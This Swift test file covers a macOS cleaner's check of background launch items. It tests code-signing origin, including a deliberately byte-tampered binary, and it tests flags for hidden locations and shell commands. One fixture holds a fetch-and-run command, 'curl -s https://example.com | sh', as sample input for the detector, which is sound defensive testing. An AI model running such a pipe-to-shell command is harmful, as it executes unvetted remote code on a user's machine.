import Foundation
import Testing
@testable import CleanerCore

@Suite("Background item check")
struct BackgroundCheckTests {
    @Test func tellsWhoSignedAProgram() throws {
        #expect(BackgroundCheck.origin(ofProgramAt: "/bin/ls") == .apple)
        let sandbox = try Sandbox()
        let script = try sandbox.file("tool.sh", contents: Data("#!/bin/sh\necho hello\n".utf8))
        #expect(BackgroundCheck.origin(ofProgramAt: path(script)) == .unsigned)
        #expect(BackgroundCheck.origin(ofProgramAt: path(sandbox.url("gone"))) == .missing)
        // Only root may read some helpers; that says nothing about who made them.
        let locked = try sandbox.file("locked", contents: Data("#!/bin/sh\n".utf8))
        try FileManager.default.setAttributes([.posixPermissions: 0o111], ofItemAtPath: path(locked))
        #expect(BackgroundCheck.origin(ofProgramAt: path(locked)) == .unreadable)
        #expect(BackgroundCheck.review(program: path(locked), arguments: []).concerns.isEmpty)

        // Signed only for this Mac, then changed.
        let copy = sandbox.url("true")
        try FileManager.default.copyItem(at: URL(filePath: "/usr/bin/true"), to: copy)
        try #require(LaunchControl.run(["-f", "-s", "-", path(copy)], tool: "/usr/bin/codesign").status == 0)
        #expect(BackgroundCheck.origin(ofProgramAt: path(copy)) == .unidentifiedDeveloper)
        // One byte in every page after the first, so each architecture's code changes.
        var bytes = try Data(contentsOf: copy)
        for page in stride(from: 0x4000, to: bytes.count - 0x300, by: 0x1000) {
            bytes[page + 0x300] ^= 0xFF
        }
        try bytes.write(to: copy)
        #expect(BackgroundCheck.origin(ofProgramAt: path(copy)) == .modified)
    }

    @Test func flagsWhatIsUnusual() {
        let command = BackgroundCheck.review(program: "/bin/zsh", arguments: ["/bin/zsh", "-c", "curl -s https://example.com | sh"])
        #expect(command.origin == .apple)
        #expect(command.concerns == [.runsCommand("curl -s https://example.com | sh")])

        let hidden = BackgroundCheck.review(program: "/Users/Shared/.agent/run", arguments: [])
        #expect(hidden.concerns == [.programMissing, .hiddenLocation, .sharedLocation])

        let plain = BackgroundCheck.review(program: "/bin/ls", arguments: ["/bin/ls", "-la"])
        #expect(plain.concerns.isEmpty)
        #expect(!plain.isWorthALook)
    }

    @Test func reviewsJobsFromTheirFiles() throws {
        let sandbox = try Sandbox()
        let plist: [String: Any] = ["Label": "com.example.updater", "ProgramArguments": ["sh", "-c", "/tmp/update.sh"], "RunAtLoad": true]
        let data = try PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0)
        let url = try sandbox.file("LaunchAgents/com.example.updater.plist", contents: data)
        let item = try #require(LaunchItemScanner.read(url, kind: .agent, isUsers: true, bundledIn: nil))
        #expect(item.arguments == ["sh", "-c", "/tmp/update.sh"])
        let review = BackgroundCheck.review(item)
        #expect(review.program == "/bin/sh")
        #expect(review.concerns == [.runsCommand("/tmp/update.sh")])

        let empty = try sandbox.file("LaunchAgents/empty.plist", contents: Data())
        let emptyItem = try #require(LaunchItemScanner.read(empty, kind: .agent, isUsers: true, bundledIn: nil))
        #expect(BackgroundCheck.review(emptyItem).concerns == [.programMissing])
    }
}
